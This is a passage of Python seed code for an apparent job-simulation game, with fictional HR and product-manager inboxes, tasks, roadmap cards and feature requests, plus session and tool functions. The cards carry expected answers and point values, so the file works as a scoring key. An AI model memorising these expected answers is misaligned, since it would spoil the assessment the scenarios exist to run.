        {"id":"e3","simulation_id":sim_id(),"from_name":cfg["teammate"]["name"],"from_role":cfg["teammate"]["role"],"from_email":cfg["teammate"]["email"],"to":"you","subject":"Before you reply to Aaron","body":f"Hey, welcome.\n\nQuick — before you write back to Aaron.\n\nDon't say yes. We don't have facilitator capacity in June (Manager Essentials Cohort 4 is in the same window), budget for this isn't in Q2, and 60% of what he's asking for IS Manager Essentials. He just doesn't want his people in a 'generic' cohort.\n\nThe right reply is three options, in this order:\n1. Route his 12 into Manager Essentials Cohort 5 (kicks off August — gets the date pressure off you)\n2. Pay-as-you-go BetterUp 1:1 coaching now (immediate, scales to his urgency, costs his line not L&D)\n3. Properly design a Q3 'Tech Lead' track (we can co-design with Eng, ship in October)\n\nMove TP-304 to 'on_hold' with that note. CC Lena. Aaron will escalate to Sofia, and that's fine — she'll back the alternatives.\n\nAlso: do NOT chase security-training learners directly. Chase the managers. Threatening reminders to learners backfired last year and you'll inherit that mess.\n\n{cfg['teammate']['name'].split()[0]}","time":"09:15","read":False,"replied":False,"priority":"high","category":"teammate","requires_action":False},
        {"id":"e4","simulation_id":sim_id(),"from_name":"HR Onboarding","from_role":"HR","from_email":"hr@helixpeople.co","to":"you","subject":"New starter onboarding tasks","body":"Welcome! Please complete by EOD:\n1. LMS admin training (45 min e-learning)\n2. Data handling for L&D records — GDPR module\n3. SoD declaration for LMS write access\n4. Code of conduct + confidentiality\n\nEmployee ID: HX-2241","time":"08:25","read":False,"replied":False,"priority":"medium","category":"onboarding","requires_action":True},
        {"id":"e5","simulation_id":sim_id(),"from_name":cfg["it"]["name"],"from_role":cfg["it"]["role"],"from_email":cfg["it"]["email"],"to":"you","subject":"LMS + reporting access","body":f"Your access:\n- LMS (Docebo): Admin\n- Looker (L&D dashboards): editor\n- DocuSign: viewer\n- Slack: #people-ld, #people-ops, #general\n- HRIS (Hibob): read-only on org chart\n\n{cfg['it']['name']}","time":"08:05","read":False,"replied":False,"priority":"low","category":"info","requires_action":False},
        {"id":"e6","simulation_id":sim_id(),"from_name":"Hannah Liu","from_role":"New Hire (Eng)","from_email":"h.liu@helixpeople.co","to":"you","subject":"Bootcamp feedback — being honest","body":"Hi,\n\nI'm in cohort 12. I posted in #new-hires last night and Marcus said to email you.\n\nThe Internal Tools module is genuinely broken. Half the links 404. The screenshots are from last year's Notion. Two of us wasted three hours yesterday trying to follow it before giving up. I've been a new hire 4 times in my career — this is the worst module I've ever sat through.\n\nI'm not trying to be difficult. Just — if the rest of the bootcamp is this rough, please tell us now so we can plan around it.\n\nHannah","time":"09:30","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
        {"id":"e7","simulation_id":sim_id(),"from_name":"LinkedIn Learning","from_role":"Account Manager","from_email":"renewals@linkedin.com","to":"you","subject":"Auto-renewal in 5 days — Helix People Co.","body":"Hello,\n\nFriendly reminder that your LinkedIn Learning Enterprise subscription (£68,000/yr, 612 seats) is set to auto-renew on 2026-05-15. The 8% price uplift applies if no action is taken.\n\nIf you'd like to discuss seat reduction or a multi-year discount, I'm available Mon-Thu.\n\nUsage in the last 12 months: 14% active learners. Top categories: Excel, project management, presentation skills.\n\nLet me know if a 30-min call works.\n\nKind regards,\nDanielle","time":"09:40","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
        {"id":"e8","simulation_id":sim_id(),"from_name":cfg["director"]["name"],"from_role":cfg["director"]["role"],"from_email":cfg["director"]["email"],"to":"l-and-d@helixpeople.co","subject":"Q2 L&D review — Thursday","body":f"Team,\n\nFor Thursday's Q2 board prep I need:\n• L&D spend vs budget by program\n• Programs we should kill or consolidate (LinkedIn Learning is the obvious one — 14% active)\n• Compliance audit readiness (security + anti-harassment)\n\nNew starter — pair with Marcus on this. Good way to learn the portfolio.\n\nAlso — Aaron will likely ping you about a Tech Lead programme. Do not commit to a 4-week build. Send him to me if he won't take alternatives.\n\n{cfg['director']['name']}","time":"09:55","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
    ])
    tasks_col.insert_many([
        {"id":"t1","simulation_id":sim_id(),"title":"Complete onboarding (LMS, GDPR, SoD)","description":"4 items from HR. GDPR + SoD are blockers for LMS admin actions.","priority":"medium","deadline":"17:00","status":"pending","points":10},
        {"id":"t2","simulation_id":sim_id(),"title":"Rewrite the Internal Tools module (TP-301)","description":"Replace dead links + last-year screenshots. Aim for 2-3 hours. Then post in #new-hires acknowledging cohort 12.","priority":"high","deadline":"15:00","status":"pending","points":25},
        {"id":"t3","simulation_id":sim_id(),"title":"Reply to Aaron Yi — three alternatives, not a yes","description":"Manager Essentials Cohort 5 / BetterUp 1:1 coaching / properly-designed Q3 Tech Lead track. CC Lena.","priority":"high","deadline":"12:00","status":"pending","points":30},
        {"id":"t4","simulation_id":sim_id(),"title":"Move TP-304 (Tech Lead Pilot) to on_hold","description":"With rationale in notes. Currently sits in 'proposed'.","priority":"high","deadline":"12:00","status":"pending","points":10},
        {"id":"t5","simulation_id":sim_id(),"title":"Push security training to ≥95% — chase managers","description":"Pull manager-level report. One-line email per manager <70%. No threatening emails to learners.","priority":"high","deadline":"17:00","status":"pending","points":25},
        {"id":"t6","simulation_id":sim_id(),"title":"Reply to Hannah (cohort 12)","description":"Acknowledge, commit to fix today, offer 1-hour live walkthrough to cohort 12. Do NOT defend the module.","priority":"high","deadline":"11:00","status":"pending","points":15},
        {"id":"t7","simulation_id":sim_id(),"title":"Decide LinkedIn Learning renewal","description":"14% active usage, £68k/yr. Don't auto-renew. Either negotiate seat reduction or kill it. Reply to Danielle.","priority":"high","deadline":"tomorrow","status":"pending","points":20},
        {"id":"t8","simulation_id":sim_id(),"title":"Schedule TP-309 (Anti-Harassment refresher)","description":"Legal-required by 2026-08-01. Content exists. Confirm with Legal, then schedule + auto-enrol.","priority":"medium","deadline":"tomorrow","status":"pending","points":15},
        {"id":"t9","simulation_id":sim_id(),"title":"Q2 L&D review for the CPO","description":"Spend vs budget, kill/consolidate candidates, compliance audit readiness. Pair with Marcus.","priority":"medium","deadline":"Thursday","status":"pending","points":15},
    ])
    _seed_hr_artifacts(cfg)

def _seed_pm_artifacts(cfg):
    """Growth PM — Roadmap (kanban) + Feature Requests (table) + events.
    Idempotent per simulation_id. Uses generic tools_col so the existing kanban/table
    renderers on the frontend pick these up automatically."""
    _sim = sim_id()
    teammate = cfg["teammate"]["name"]
    manager = cfg["manager"]["name"]
    director = cfg["director"]["name"]
    # ── Roadmap (kanban) ───────────────────────────────────────
    roadmap_cards = [
        {"id":"RM-501","title":"Pricing-page A/B test — '3-tier hero' variant","area":"pricing","owner":"you","squad":"Growth","effort_weeks":2,"impact":"high",
         "column":"launched","expected_column":"parked","priority":"HIGH","risk_flags":["instrumentation_bug","double_counted_conversions","ceo_cited_in_allhands"],
         "summary":"Drew called this a winner Friday (+8% sign-ups). Pushed to 100% on Saturday. Marcus (CEO) cited it in this morning's all-hands. The catch: signup_started AND signup_completed both fire as 'conversion' for the variant — true lift is actually -12%, not +8%. Kai (eng partner) shipped this and is on parental leave for 2 weeks.",
         "playbook":["Reproduce the double-count locally — get a screenshot","Pull truth from the data warehouse (signup_completed only)","Move to 'parked' with notes: 'instrumentation review identified counting error, unwinding'","Surface RM-502 (checkout flow win) as the real Q2 lift in a follow-up to Marcus","Do NOT name Drew or Kai in writing. Frame it as 'we identified', not 'Drew was wrong'"],
         "correct_action":"park_and_reframe","points":30},
        {"id":"RM-502","title":"Checkout flow — 3 steps → 1 step","area":"activation","owner":teammate,"squad":"Growth","effort_weeks":3,"impact":"high",
         "column":"launched","expected_column":"launched","priority":"HIGH","risk_flags":[],
         "summary":"Shipped 3 weeks ago, instrumentation clean. True signup→paid conversion is +6.4%. This is the REAL Q2 win — surface it to Marcus instead of the broken pricing test.",
         "playbook":["Pull the 4-week sustained lift number","Write a 5-line all-hands recap email Marcus can forward","Credit Anya — she designed the simplification"],
         "correct_action":"surface_as_win","points":15},
        {"id":"RM-503","title":"Onboarding 'aha moment' redesign","area":"activation","owner":"you","squad":"Growth","effort_weeks":4,"impact":"medium",
         "column":"discovery","expected_column":"discovery","priority":"MEDIUM","risk_flags":["needs_user_interviews"],
         "summary":"Activation drops 38% between sign-up and first workflow created. Need 6 user interviews + an instrumentation pass before scoping a fix.",
         "playbook":["Book 6 user interviews with new accounts","Map the funnel: signup → first_workspace → first_workflow → first_invite","Bring a shaped problem doc to roadmap review next sprint"],
         "correct_action":"continue_discovery","points":12},
        {"id":"RM-504","title":"Compliance — fix opted-out notification leak","area":"compliance","owner":"you","squad":"Growth","effort_weeks":1,"impact":"high",
         "column":"in_build","expected_column":"in_build","priority":"HIGH","risk_flags":["gdpr_risk","privacy_team_flagged","ceo_aware"],
         "summary":"A growth-loop nudge ('your teammate just shared a doc') is being sent to users who explicitly opted out of activity notifications. ~3,200 affected. Privacy raised this Friday. Eng has a fix in PR — needs you to confirm copy + send the apology email to affected users.",
         "playbook":["Approve eng's PR (verify opt-out check fires before the email service)","Draft a one-line apology email to affected users + cc Privacy","Add a regression test as a follow-up ticket","Reply to Privacy with timeline"],
         "correct_action":"ship_fix","points":22},
        {"id":"RM-505","title":"Self-serve trial extension (14 → 21 days)","area":"monetization","owner":teammate,"squad":"Growth","effort_weeks":2,"impact":"medium",
         "column":"in_review","expected_column":"in_review","priority":"MEDIUM","risk_flags":["sales_objects"],
         "summary":"Pilot data shows +11% paid conversion with no impact on sales-assist deals. Sales VP Brendan says it cannibalises his pipeline (it doesn't, per data). Awaiting Rohan's review.",
         "playbook":["Pull the cohort-by-segment data Anya prepared","Walk Brendan through the segment split (self-serve vs sales-assist)","Push for ship with monitoring on sales-assist segment for 4 weeks"],
         "correct_action":"defend_with_data","points":15},
        {"id":"RM-506","title":"Referral program v2","area":"acquisition","owner":"you","squad":"Growth","effort_weeks":6,"impact":"low",
         "column":"backlog","expected_column":"backlog","priority":"LOW","risk_flags":["weak_evidence"],
         "summary":"Drew has been championing this for two quarters. Last attempt converted at 0.4%. No fresh data. Don't promote until there's a hypothesis grounded in current funnel data.",
         "playbook":["Ask Drew for a hypothesis doc with current data","Don't kill it publicly — just leave in backlog","Revisit after RM-503 discovery"],
         "correct_action":"keep_in_backlog","points":6},
        {"id":"RM-507","title":"Pricing-page copy refresh (founder's idea)","area":"pricing","owner":"you","squad":"Growth","effort_weeks":1,"impact":"low",
         "column":"backlog","expected_column":"parked","priority":"LOW","risk_flags":["founder_request","already_shipped_q4_2025"],
         "summary":"Marcus sent a doc Saturday morning suggesting a copy refresh. The exact change he's proposing was already shipped in November 2025 — he's forgotten. Reply with a polite link to the diff and the post-launch metrics, then park.",
         "playbook":["Find the Nov 2025 changelog entry + impact memo","Reply to Marcus with 'we shipped this — here's the data' — keep tone neutral","Park the card with note"],
         "correct_action":"park_with_evidence","points":12},
        {"id":"RM-508","title":"Welcome email re-sequence","area":"activation","owner":teammate,"squad":"Growth","effort_weeks":2,"impact":"medium",
         "column":"in_build","expected_column":"in_build","priority":"MEDIUM","risk_flags":[],
         "summary":"Anya is rewriting days 1, 3, 7 emails. Eng capacity confirmed. Goes live next sprint. No action needed today.",
         "playbook":["Monitor."],"correct_action":"monitor","points":4},
        {"id":"RM-509","title":"Empty-state guidance for new workspaces","area":"activation","owner":teammate,"squad":"Growth","effort_weeks":1,"impact":"low",
         "column":"launched","expected_column":"launched","priority":"LOW","risk_flags":[],
         "summary":"Small ship last week. +1.8% first-workflow rate. Closed.",
         "playbook":["Archive."],"correct_action":"archive","points":3},
        {"id":"RM-510","title":"Embedded share widget","area":"acquisition","owner":"you","squad":"Growth","effort_weeks":5,"impact":"medium",
         "column":"backlog","expected_column":"parked","priority":"LOW","risk_flags":["sales_asked","no_user_evidence","competitor_feature_request"],
         "summary":"Brendan keeps pushing this because two prospects asked. No usage hypothesis, no instrumentation plan, similar widget by competitor performs poorly publicly. Park with rationale, don't kill silently.",
         "playbook":["Park with note: 'no evidence, revisit if competitor data emerges'","Reply to Brendan with the rationale, not a stonewall"],
         "correct_action":"park_with_rationale","points":10},
    ]
    # ── Feature Requests (table) ───────────────────────────────
    feature_requests = [
        {"req_id":"FR-7001","title":"Custom pricing-tier picker","source":"Sales","requester":"Brendan O'Sullivan","customers_affected":1,"arr_impact_gbp":140000,"status":"open","dupe_of":None,"notes":"Acme Corp deal — single customer. Don't roadmap-commit; offer a manual workaround for the deal."},
        {"req_id":"FR-7002","title":"SSO for free tier","source":"Sales","requester":"Brendan O'Sullivan","customers_affected":0,"arr_impact_gbp":0,"status":"open","dupe_of":None,"notes":"No named customer. Free-tier SSO undermines our paid auth model. Push back."},
        {"req_id":"FR-7003","title":"Dark mode","source":"Customer Success","requester":"Mei Chang","customers_affected":47,"arr_impact_gbp":12000,"status":"open","dupe_of":None,"notes":"Real user demand, small ARR. Defer to design system refresh."},
        {"req_id":"FR-7004","title":"Bulk-import CSV","source":"Sales","requester":"Brendan O'Sullivan","customers_affected":3,"arr_impact_gbp":78000,"status":"dupe","dupe_of":"FR-6840","notes":"Already in_build under FR-6840. Reply: 'shipping in 3 weeks'."},
        {"req_id":"FR-7005","title":"Audit log export","source":"Customer Success","requester":"Mei Chang","customers_affected":4,"arr_impact_gbp":85000,"status":"open","dupe_of":None,"notes":"Compliance-flagged enterprise customer. Real demand. Route to Platform PM, not Growth."},
        {"req_id":"FR-7006","title":"Custom onboarding flows","source":"Sales","requester":"Brendan O'Sullivan","customers_affected":1,"arr_impact_gbp":200000,"status":"open","dupe_of":None,"notes":"Brendan's pending £200k deal. Vague spec — needs scoping call with prospect before any commit."},
        {"req_id":"FR-7007","title":"Webhook retries","source":"Product","requester":"Drew Holloway","customers_affected":0,"arr_impact_gbp":0,"status":"open","dupe_of":None,"notes":"No customer ask. Drew's hunch. Need evidence before promoting."},
        {"req_id":"FR-7008","title":"Admin role 2FA enforcement","source":"Customer Success","requester":"Mei Chang","customers_affected":3,"arr_impact_gbp":62000,"status":"open","dupe_of":None,"notes":"Security team should own. Route, don't roadmap."},
        {"req_id":"FR-7009","title":"Spanish localization","source":"Sales","requester":"Brendan O'Sullivan","customers_affected":2,"arr_impact_gbp":54000,"status":"open","dupe_of":None,"notes":"Latam deals. Localisation is a Platform programme — needs strategy, not a one-off."},
        {"req_id":"FR-7010","title":"Workflow templates marketplace","source":"Product","requester":"Anya Ostrovsky","customers_affected":0,"arr_impact_gbp":0,"status":"parked","dupe_of":None,"notes":"Attempted 2024. Closed for under-use. Don't revive without new evidence."},
        {"req_id":"FR-7011","title":"Custom branding for shared links","source":"Customer Success","requester":"Mei Chang","customers_affected":12,"arr_impact_gbp":18000,"status":"open","dupe_of":None,"notes":"Small ARR, moderate demand. Park with a 'revisit Q3' note."},
        {"req_id":"FR-7012","title":"Native Salesforce sync","source":"Sales","requester":"Brendan O'Sullivan","customers_affected":2,"arr_impact_gbp":160000,"status":"dupe","dupe_of":"FR-6201","notes":"Exists as part of our Partner tier. Brendan unaware. Send him the rollout doc."},
        {"req_id":"FR-7013","title":"iOS app","source":"Customer Success","requester":"Mei Chang","customers_affected":0,"arr_impact_gbp":0,"status":"open","dupe_of":None,"notes":"No customer ask attached. Anecdote only. Not Growth scope."},
    ]
    if tools_col is not None:
        tools_col.delete_many({"simulation_id":_sim,"name":"Roadmap"})
        tools_col.insert_one({
            "tool_id":f"tl_roadmap_{_sim}","simulation_id":_sim,"scenario_id":None,
            "name":"Roadmap","tool_type":"kanban","icon":"🗺","tint":"#0EA5E9",
            "category":"product","summary":"Growth roadmap — features moving through discovery → build → review → launched. Pick the right column and the right narrative.",
            "data":{"columns":["backlog","discovery","in_build","in_review","launched","parked"],"cards":roadmap_cards},
            "actions_log":[],"created_at":datetime.utcnow().isoformat(),
        })
        tools_col.delete_many({"simulation_id":_sim,"name":"Feature Requests"})
        tools_col.insert_one({
            "tool_id":f"tl_requests_{_sim}","simulation_id":_sim,"scenario_id":None,
            "name":"Feature Requests","tool_type":"table","icon":"📥","tint":"#F59E0B",
            "category":"product","summary":"Inbound requests from Sales, CS, and Product. Triage dupes, weak-evidence asks, and route what isn't Growth scope.",
            "data":{"columns":["req_id","title","source","requester","customers_affected","arr_impact_gbp","status","dupe_of","notes"],"rows":feature_requests,"expected_corrections":[]},
            "actions_log":[],"created_at":datetime.utcnow().isoformat(),
        })
    if not list(system_events_col.find({"simulation_id":_sim,"tool":"roadmap"}).limit(1)):
        system_events_col.insert_many([
            {"id":"ev_pm1","simulation_id":_sim,"type":"escalation","tool":"roadmap","trigger_at":4,"end_at":None,"start_msg":f"Slack from {director}: 'Quick one — Brendan's flagging that you're not committing to his three asks. I want product discipline, not yeses. Don't fold.'","end_msg":None,"points_for_report":8,"triggered":False,"resolved":False},
            {"id":"ev_pm2","simulation_id":_sim,"type":"deadline","tool":"roadmap","trigger_at":7,"end_at":None,"start_msg":"Reminder: the pricing-test 'win' is in tomorrow's investor update unless you flag it today.","end_msg":None,"points_for_report":6,"triggered":False,"resolved":False},
        ])

def seed_pm(cfg):
    emails_col.insert_many([
        {"id":"e1","simulation_id":sim_id(),"from_name":cfg["manager"]["name"],"from_role":cfg["manager"]["role"],"from_email":cfg["manager"]["email"],"to":"you","subject":"Welcome — and a quiet fire to handle today","body":f"Welcome to {cfg['company']}.\n\nI'm dropping you in cold because we genuinely need you today.\n\n1. RM-501 — Friday Drew called the new pricing-page A/B test a winner (+8%). It went 100% on Saturday. Marcus cited it in this morning's all-hands. Anya looked at the instrumentation last night — signup_started AND signup_completed both fire as 'conversion' for the variant. True lift is -12%, not +8%. Kai (eng) shipped it and is on parental leave for two weeks. Unwind this quietly and surface RM-502 (the real checkout-flow win) as the Q2 story. Do NOT publicly call Drew wrong. Do NOT email Marcus 'the test is broken' — frame it as 'instrumentation review' and own it.\n2. RM-504 — Privacy flagged an opt-out leak in a growth-loop email. ~3,200 users. Eng has a PR. You approve, you draft the apology, you reply to Privacy.\n3. Brendan (Sales VP) will email you about three features. I don't want a no, and I don't want a yes. I want triage and routing — the Feature Requests tool tells you what's a dupe, what's not even Growth scope, what's a one-customer ask vs. a roadmap candidate.\n4. Marcus also sent a 'pricing copy idea' over the weekend. We shipped that change in November. Send him the diff + impact, politely.\n\nGround rules:\n• Never roadmap-promise in week 1. Especially not to Sales.\n• 'Instrumentation review' is the magic phrase. Not 'broken test'.\n• If you're unsure, ping Anya before posting in #growth.\n\nStandup at 09:30. Welcome aboard.\n\n{cfg['manager']['name']}","time":"08:40","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
        {"id":"e2","simulation_id":sim_id(),"from_name":"Drew Holloway","from_role":"Senior Data Analyst","from_email":"d.holloway@northwind.cloud","to":"you","subject":"Welcome! Quick context on the pricing test","body":"Hey, welcome aboard.\n\nQuick heads-up — I called the pricing-page test a winner Friday and we rolled it out Saturday. Marcus mentioned it in all-hands this morning. Sample size was 14k per variant, lift was +8.1% on conversion, p<0.01. Pretty clean result.\n\nLet me know if you want the deck — happy to walk you through. I know it's day one but the win matters because we're heading into the Q2 board update and Marcus has been hunting for a growth story.\n\nDrew","time":"08:55","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
        {"id":"e3","simulation_id":sim_id(),"from_name":cfg["teammate"]["name"],"from_role":cfg["teammate"]["role"],"from_email":cfg["teammate"]["email"],"to":"you","subject":"Read this before you reply to Drew","body":f"Hey, welcome.\n\nQuick before you write back.\n\nDrew's test is broken. He computed conversion as (signup_started OR signup_completed) / visitors. The variant changed the flow so signup_started fires earlier — that's why his 'lift' is +8%. If you count signup_completed only (which is what's tied to revenue), the variant is -12%.\n\nI flagged this to Rohan last night. We're not going to call Drew out publicly — he's a good analyst who made a single counting error, not a fraud. The playbook is:\n\n1. Reply to Drew warmly. Thank him for the work. Tell him you've been digging into the instrumentation and want to walk through it with him 1:1 tomorrow. DON'T email him 'the test is broken'.\n2. Park RM-501. In the card notes write: 'instrumentation review identified counting error in conversion event. Variant unwound. Follow-up on conversion-event definition standardisation as a separate workstream.' This phrasing matters for the all-hands recap.\n3. Surface RM-502 (the checkout-flow simplification I shipped 3 weeks ago) as the real Q2 win — it's +6.4% on signup→paid, instrumentation clean. Write a 5-line note Marcus can forward.\n4. Reply to Marcus's all-hands email today, NOT tomorrow. The longer we leave the +8% number sitting in the room, the worse it is when we correct it.\n\nOne more thing: Brendan is going to ask for three features. Don't say no, don't say yes. The Feature Requests tool tells you which are dupes and which aren't Growth scope. Route, route, route.\n\n{cfg['teammate']['name'].split()[0]}","time":"09:00","read":False,"replied":False,"priority":"high","category":"teammate","requires_action":False},
        {"id":"e4","simulation_id":sim_id(),"from_name":cfg["director"]["name"],"from_role":cfg["director"]["role"],"from_email":cfg["director"]["email"],"to":"all-hands@northwind.cloud","subject":"Q2 momentum — that pricing-page win","body":f"Team,\n\nQuick all-hands callout: huge thanks to Drew, Kai, and the growth squad for the new pricing-page experiment. +8.1% on sign-ups is the kind of number that moves the Q2 narrative.\n\nThis goes in the investor update tomorrow.\n\nNew starter on growth — welcome. Hit the ground running.\n\n{cfg['director']['name']}","time":"08:15","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
        {"id":"e5","simulation_id":sim_id(),"from_name":"Brendan O'Sullivan","from_role":"VP Sales","from_email":"b.osullivan@northwind.cloud","to":"you","subject":"Three features I need committed before EOD","body":"Welcome aboard. Need three things in writing today:\n\n1. Custom pricing-tier picker — Acme deal worth £140k ARR, closing Friday. Need it on the roadmap.\n2. Custom onboarding flows — £200k deal, prospect demoed today. Vague but they want 'something more guided'.\n3. SSO on the free tier — generally would unblock several deals. (No specific named accounts yet.)\n\nDon't slow-walk these. The deals don't wait. If product has reasons to push back, fine, but I need to be able to tell my reps Wednesday morning where each one stands.\n\nBrendan","time":"09:05","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
        {"id":"e6","simulation_id":sim_id(),"from_name":"Mei Chang","from_role":"PMM Lead","from_email":"m.chang@northwind.cloud","to":"you","subject":"Notification opt-out leak — need your sign-off","body":"Hi,\n\nQuick one for day one. Privacy flagged on Friday: a growth-loop notification ('your teammate just shared a doc') is being sent to users who explicitly opted out of activity notifications. ~3,200 affected.\n\nEng has the PR — needs PM sign-off on:\n1. Confirm the opt-out check is in the right place (before the email service, not in-template).\n2. Approve the apology email copy (draft attached).\n3. Decide if we tell Privacy 'fixed within 24 hours' or commit to a slower regression-test path.\n\nThis is RM-504. Please pick it up today — Privacy wants a status reply by EOD.\n\nMei","time":"09:10","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
        {"id":"e7","simulation_id":sim_id(),"from_name":"HR Onboarding","from_role":"HR","from_email":"hr@northwind.cloud","to":"you","subject":"New starter onboarding tasks","body":"Welcome! Please complete by EOD:\n1. Product analytics access training (45 min)\n2. Data handling — customer data & GDPR\n3. Roadmap-tool admin training\n4. Code of conduct + customer-promise policy\n\nEmployee ID: NW-3142","time":"08:25","read":False,"replied":False,"priority":"medium","category":"onboarding","requires_action":True},
        {"id":"e8","simulation_id":sim_id(),"from_name":cfg["it"]["name"],"from_role":cfg["it"]["role"],"from_email":cfg["it"]["email"],"to":"you","subject":"Tool access","body":f"Your access:\n- Roadmap (Productboard): admin\n- Data warehouse (BigQuery, read-only): granted\n- Amplitude: editor\n- LaunchDarkly: editor\n- Slack: #growth, #product, #general\n- Linear (eng): read\n\n{cfg['it']['name']}","time":"08:00","read":False,"replied":False,"priority":"low","category":"info","requires_action":False},
    ])
    tasks_col.insert_many([
        {"id":"t1","simulation_id":sim_id(),"title":"Complete onboarding (analytics, GDPR, roadmap tool)","description":"4 onboarding items. GDPR is a blocker for any work on RM-504.","priority":"medium","deadline":"17:00","status":"pending","points":10},
        {"id":"t2","simulation_id":sim_id(),"title":"Pull truth from the warehouse on RM-501","description":"Re-run conversion as signup_completed only by variant. Get a screenshot of the count discrepancy.","priority":"high","deadline":"11:00","status":"pending","points":25},
        {"id":"t3","simulation_id":sim_id(),"title":"Park RM-501 with the right narrative","description":"Move to 'parked', notes phrased as 'instrumentation review identified counting error, unwinding'. Do not name Drew or Kai.","priority":"high","deadline":"12:00","status":"pending","points":25},
        {"id":"t4","simulation_id":sim_id(),"title":"Reply to Marcus (CEO) — quietly correct the record","description":"Surface RM-502 (checkout flow, +6.4% on signup→paid) as the real Q2 win. Keep it 5 lines. Do not write 'the pricing test is broken'.","priority":"high","deadline":"13:00","status":"pending","points":30},
        {"id":"t5","simulation_id":sim_id(),"title":"Reply to Drew warmly","description":"Thank him, propose a 1:1 walkthrough tomorrow on conversion-event definitions. No public callout.","priority":"high","deadline":"11:30","status":"pending","points":15},
        {"id":"t6","simulation_id":sim_id(),"title":"Triage Brendan's three asks","description":"FR-7001 (one customer, offer manual workaround), FR-7002 (no customer, push back), FR-7006 (scoping call before commit). No roadmap promises.","priority":"high","deadline":"15:00","status":"pending","points":20},
        {"id":"t7","simulation_id":sim_id(),"title":"Sign off RM-504 (notification opt-out fix)","description":"Approve eng PR, draft apology email, reply to Mei + Privacy with timeline.","priority":"high","deadline":"16:00","status":"pending","points":20},
        {"id":"t8","simulation_id":sim_id(),"title":"Reply to Marcus on his weekend 'pricing copy' idea","description":"Send him the Nov 2025 changelog + impact memo. Park RM-507. Tone: neutral, evidence-led.","priority":"medium","deadline":"tomorrow","status":"pending","points":12},
        {"id":"t9","simulation_id":sim_id(),"title":"Sweep Feature Requests — mark dupes + non-Growth scope","description":"FR-7004 + FR-7012 are dupes. FR-7005, FR-7008, FR-7009 should route out of Growth. Reply to requesters with the routing.","priority":"medium","deadline":"tomorrow","status":"pending","points":15},
    ])
    _seed_pm_artifacts(cfg)

SEED_FUNCTIONS = {
    "accountant": seed_accountant,
    "cybersecurity": seed_cybersecurity,
    "marketing": seed_marketing,
    "developer": seed_developer,
    "procurement": seed_procurement,
    "hr": seed_hr,
    "pm": seed_pm,
}

def init_session(career, experience_level: str = "experienced"):
    cfg = CAREER_CONFIGS[career]
    sessions_col.update_one(
        {"session_id": session_id()},
        {"$set": {
            "session_id": session_id(), "sim_id": sim_id(), "career": career,
            "company": cfg["company"], "title": cfg["title"],
            "manager": cfg["manager"]["name"], "client": cfg["client"]["name"],
            "teammate": cfg["teammate"]["name"], "it": cfg["it"]["name"],
            "hr": cfg["hr"]["name"], "director": cfg["director"]["name"],
            "interaction_count": 0, "tasks_completed": [], "emails_read": [],
            "emails_replied": [], "discrepancies_found": [], "alerts_triaged": [],
            "performance_notes": [], "deadline_changed": False,
            "teammate_challenged": False, "client_escalated": False,
            "surprise_task": False, "it_outage_active": False,
            "experience_level": experience_level,
            "beginner_first_mistakes": [],   # tools where the first mistake has been forgiven
            "current_day": 1,                 # day-progression cursor
            "started_at": datetime.utcnow().isoformat(),
            # 2hr-real = 8hr-sim clock. Frontend ticks 09:00 → 17:00 over 2hrs.
            "real_start_time": datetime.utcnow().isoformat(),
            "auto_ended": False,
        }},
        upsert=True,
    )

def init_reputation():
    reputation_col.update_one(
        {"session_id": session_id()},
        {"$set": {
            "session_id": session_id(), "simulation_id": sim_id(),
            "rudeness": 0, "dismissiveness": 0, "unprofessional": 0,
            "lying": 0, "threats": 0, "harassment": 0,
            "helpful": 0, "collaborative": 0, "ownership": 0,
            "events": [],
            "teammate_complained": False, "client_complained": False,
            "manager_warned": False,
            "hr_meeting_scheduled": False, "hr_warnings": 0,
            "skip_level_engaged": False, "final_warning_issued": False,
            "status": "good_standing",
        }},
        upsert=True,
    )

# ══════════════════════════════════════════
# TOOLS
# ══════════════════════════════════════════

@tool
def get_inbox() -> str:
    """Get all emails including agent-to-agent messages where user is CC'd."""
    mails = list(emails_col.find({"simulation_id": sim_id()}, {"_id": 0}).sort("time", 1))
    comms = list(agent_comms_col.find({"simulation_id": sim_id(), "visible_to_user": True}, {"_id": 0}).sort("timestamp", 1))
    lines = []
    for e in mails:
        st = "replied" if e.get("replied") else ("read" if e.get("read") else "UNREAD")
        lines.append(f"[{e['priority'].upper()}] {e['time']} {e['from_name']} → You | {e['subject']} | {st} | id:{e['id']}")
    for c in comms:
        lines.append(f"[CC] {c.get('timestamp','')[:5]} {c['from_agent']} → {c['to_agent']} | {c['subject']} | (you are CC'd) | id:{c['id']}")
    return "\n".join(lines) if lines else "Inbox is empty."

@tool
def read_email(email_id: str) -> str:
    """Read an email by ID and mark as read."""
    e = emails_col.find_one_and_update({"id": email_id, "simulation_id": sim_id()}, {"$set": {"read": True}}, {"_id": 0})
    if not e:
        c = agent_comms_col.find_one({"id": email_id, "simulation_id": sim_id()}, {"_id": 0})
        if c: return f"FROM: {c['from_agent']}\nTO: {c['to_agent']} (CC: you)\nSUBJECT: {c['subject']}\n\n{c['body']}"
        return "Not found."
    sessions_col.update_one({"session_id": session_id()}, {"$addToSet": {"emails_read": email_id}})
    return f"FROM: {e['from_name']} ({e.get('from_role','')})\nTO: {e.get('to','you')}\nSUBJECT: {e['subject']}\n\n{e['body']}"

@tool
def send_reply(email_id: str, reply_text: str) -> str:
    """Reply to an email. Content will be evaluated for professionalism."""
    e = emails_col.find_one({"id": email_id, "simulation_id": sim_id()})
    if not e: return "Not found."
    emails_col.update_one({"id": email_id}, {"$set": {"replied": True, "reply_text": reply_text}})
    sessions_col.update_one({"session_id": session_id()}, {"$addToSet": {"emails_replied": email_id}})
    return f"Reply sent to {e['from_name']}."

@tool
def get_tasks() -> str:
    """Get task list with status, priority, deadline, points."""
    ts = list(tasks_col.find({"simulation_id": sim_id()}, {"_id": 0}))
    return "\n".join([f"{'✅' if t['status']=='done' else '🔲'} [{t['priority'].upper()}] {t['title']} | Due:{t['deadline']} | {t['points']}pts | id:{t['id']}" for t in ts])

@tool
def complete_task(task_id: str) -> str:
    """Mark task as done. Awards a SMALL completion credit (20% of task points). The remaining 80% is held until the manager reviews the actual work via manager_review_task and is happy with quality."""
